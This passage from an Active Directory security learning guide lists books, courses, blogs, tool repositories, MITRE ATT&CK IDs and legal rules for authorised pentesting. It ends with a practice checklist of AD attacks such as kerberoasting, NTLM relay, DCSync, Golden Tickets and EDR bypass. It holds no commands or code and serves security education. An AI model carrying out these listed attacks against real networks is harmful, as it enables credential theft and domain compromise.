1. **"Active Directory Security: Securing Your Windows Network"** - Matthew Conover (NSA)
   - Deep dive into AD security architecture
   - Intelligence community perspective

2. **"Attacking Network Protocols"** - James Forshaw
   - Includes Kerberos and NTLM analysis
   - Protocol-level attack understanding

3. **"The Hacker Playbook 3"** - Peter Kim
   - Practical AD attack methodologies
   - Red team tactics

**Defensive Focus**:
1. **"Active Directory: Designing, Deploying, and Running Active Directory"** - Brian Desmond et al.
   - Comprehensive AD administration
   - Security best practices

2. **"Windows Security Monitoring"** - Andrei Miroshnikov
   - Event log analysis
   - Detection engineering

---

### Online Courses

| Course | Platform | Instructor | Difficulty | Cost |
|--------|----------|-----------|-----------|------|
| **Attacking and Defending Active Directory** | PentesterAcademy | Nikhil Mittal | 🔴 | $299 |
| **Active Directory Penetration Testing** | TCM Security | Heath Adams | 🟡 | $30 |
| **Red Team Ops** | Zero-Point Security | Rasta Mouse | 🔴 | £399 |
| **Advanced Penetration Testing** | eLearnSecurity | Multiple | 🔴 | $2,199 |

---

### Community Resources

**Blogs & Research**:
- **SpecterOps Blog**: https://posts.specterops.io
  - BloodHound developers
  - Cutting-edge AD research

- **Harmj0y Blog**: https://blog.harmj0y.net
  - PowerView creator
  - Advanced AD attack techniques

- **ADSecurity.org**: https://adsecurity.org (Sean Metcalf)
  - Comprehensive AD attack/defense resource

- **Microsoft Security Blog**: https://www.microsoft.com/security/blog
  - Official guidance and threat intelligence

**GitHub Repositories**:
- **PayloadsAllTheThings - AD Section**: Comprehensive attack cheatsheet
- **Impacket**: Essential Python tools
- **BloodHound**: Graph-based AD analysis
- **PowerView**: AD enumeration framework
- **ADModule**: Microsoft AD cmdlets

**YouTube Channels**:
- **IppSec**: HackTheBox walkthroughs (many AD boxes)
- **13Cubed**: Digital forensics and AD analysis
- **John Hammond**: CTF and AD challenges

---

### MITRE ATT&CK Framework

**Relevant Tactics for AD**:
- **TA0001**: Initial Access
- **TA0002**: Execution
- **TA0003**: Persistence
- **TA0004**: Privilege Escalation
- **TA0005**: Defense Evasion
- **TA0006**: Credential Access
- **TA0007**: Discovery
- **TA0008**: Lateral Movement

**Key AD Techniques**:
- **T1003**: OS Credential Dumping (LSASS, NTDS.dit)
- **T1558**: Steal or Forge Kerberos Tickets
- **T1550**: Use Alternate Authentication Material (PTH, PTT)
- **T1021**: Remote Services (SMB, WinRM, RDP)
- **T1484**: Domain Policy Modification (GPO abuse)

**Resource**: https://attack.mitre.org

---

### Cheat Sheets & Quick References

**Command References**:
- **PowerView Cheat Sheet**: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
- **Impacket Guide**: https://www.secureauth.com/labs/impacket
- **Rubeus Usage**: https://github.com/GhostPack/Rubeus
- **CrackMapExec Wiki**: https://wiki.porchetta.industries

**Attack Workflow Diagrams**:
- **AD Attack Mind Map**: Visual representation of attack paths
- **Kerberos Attack Cheat Sheet**: Protocol-specific attacks
- **BloodHound Cypher Queries**: Pre-built analysis queries

---

## ⚖️ Legal & Ethical Guidelines

### Authorization Requirements

**CRITICAL**: All Active Directory attacks and enumeration techniques described in this collection are **ILLEGAL** without explicit written authorization.

**Required Authorization**:
- **Penetration Testing**: Signed contract with explicit scope
- **Red Team Engagement**: Rules of engagement document
- **Research**: Isolated lab environment or authorized bug bounty program
- **Education**: Personal lab or authorized training platforms

**Unauthorized Access Violations**:
- **Computer Fraud and Abuse Act (CFAA)** - US Federal Law
- **Computer Misuse Act** - UK Law
- **GDPR** - EU data protection violations
- **Local cybercrime laws** in your jurisdiction

**Penalties**: Criminal prosecution, civil liability, imprisonment, significant fines

---

### Ethical Pentesting Framework

**Pre-Engagement**:
1. Obtain written authorization (statement of work, contract)
2. Define explicit scope (IP ranges, domains, systems)
3. Establish communication channels
4. Agree on testing windows and restrictions
5. Confirm Rules of Engagement (RoE)

**During Engagement**:
1. Stay within defined scope
2. Document all activities with timestamps
3. Report critical findings immediately
4. Avoid causing service disruptions (DoS)
5. Maintain confidentiality of discovered information
6. Do not exfiltrate sensitive data (only proof of access)

**Post-Engagement**:
1. Provide comprehensive report
2. Securely delete all captured data
3. Remove persistence mechanisms
4. Restore systems to original state
5. Conduct debrief with client

---

### Responsible Disclosure

If you discover vulnerabilities during authorized research:

1. **Do Not**: Publicly disclose immediately
2. **Do**: Contact vendor/organization privately
3. **Allow**: 90 days for remediation (industry standard)
4. **Coordinate**: Disclosure timeline with vendor
5. **Document**: Timeline and communication for reference

**Bug Bounty Programs**: Use platforms like HackerOne, Bugcrowd for authorized testing with legal protection.

---

### Educational Use Statement

This knowledge base is provided for:
- **Authorized penetration testing**
- **Security research in controlled environments**
- **Defensive security education**
- **Academic study of computer security**

**Not intended for**:
- Unauthorized access to systems
- Malicious activity of any kind
- Violation of laws or regulations

**Your Responsibility**: Ensure all activities comply with applicable laws and have proper authorization.

---

## 🔄 Continuous Learning

Active Directory security is a rapidly evolving field. Stay current through:

1. **Follow Security Researchers**:
   - @harmj0y, @SpecterOps, @gentilkiwi, @PyroTek3 on Twitter
   - Security conference presentations (DEF CON, Black Hat, BSides)

2. **Monitor Vulnerability Disclosures**:
   - Microsoft Security Response Center (MSRC)
   - CVE databases for AD-related vulnerabilities
   - Zero-day discoveries and patches

3. **Practice Continuously**:
   - New HackTheBox/TryHackMe releases
   - Participate in CTFs with AD components
   - Build and break your own labs

4. **Contribute to Community**:
   - Write blog posts about findings
   - Develop tools or improvements
   - Share anonymized case studies
   - Mentor others in the field

---

## 📊 Progress Tracking

**Self-Assessment Checklist**:

### Beginner Milestones
- [ ] Successfully enumerate AD domain with PowerView
- [ ] Collect and analyze BloodHound data
- [ ] Perform AS-REP roasting attack
- [ ] Execute password spray attack
- [ ] Understand Kerberos ticket structure

### Intermediate Milestones
- [ ] Successfully kerberoast and crack service account
- [ ] Execute NTLM relay attack
- [ ] Perform DCSync attack
- [ ] Abuse constrained delegation
- [ ] Identify and exploit weak ACLs

### Advanced Milestones
- [ ] Complete ACL abuse chain from BloodHound
- [ ] Execute cross-domain trust attack
- [ ] Create and use Golden/Silver tickets
- [ ] Perform DCShadow attack
- [ ] Bypass EDR in lab environment

### Expert Milestones
- [ ] Develop custom AD attack tool
- [ ] Discover novel attack technique
- [ ] Build detection rules for advanced attacks
- [ ] Contribute to open-source AD security tools
- [ ] Achieve community recognition

---

## 🎯 Next Steps

1. **Review the Content Map** and select your starting document based on skill level
2. **Set up a practice lab** using GOAD or HackTheBox
3. **Follow the Learning Path** structured progression
4. **Install essential tools** from the toolkit section
5. **Practice enumeration** before attempting exploitation
6. **Study both offensive and defensive** perspectives
7. **Document your learning** in notes, blogs, or reports
8. **Engage with the community** through forums, Discord, Twitter

---

## 📝 Document Metadata

**Version**: 1.0
**Last Updated**: January 2025
**Maintained By**: Security Research Collection
**Target Audience**: Aspiring Elite Security Researchers
**Feedback**: Contributions and corrections welcome

**Related Categories**:
- Network Security & Penetration Testing
- Windows Exploitation
- Red Team Operations
- SOC & Detection Engineering

---

**Remember**: The path to advanced Active Directory expertise requires dedication, continuous learning, ethical conduct, and hundreds of hours of hands-on practice. This collection provides the roadmap—your commitment determines the destination.

**Start your journey with**: [AD Enumeration](./ad-enumeration.md)

---

*This document is part of the Awesome Security Collection maintained for comprehensive cybersecurity education and authorized security research.*
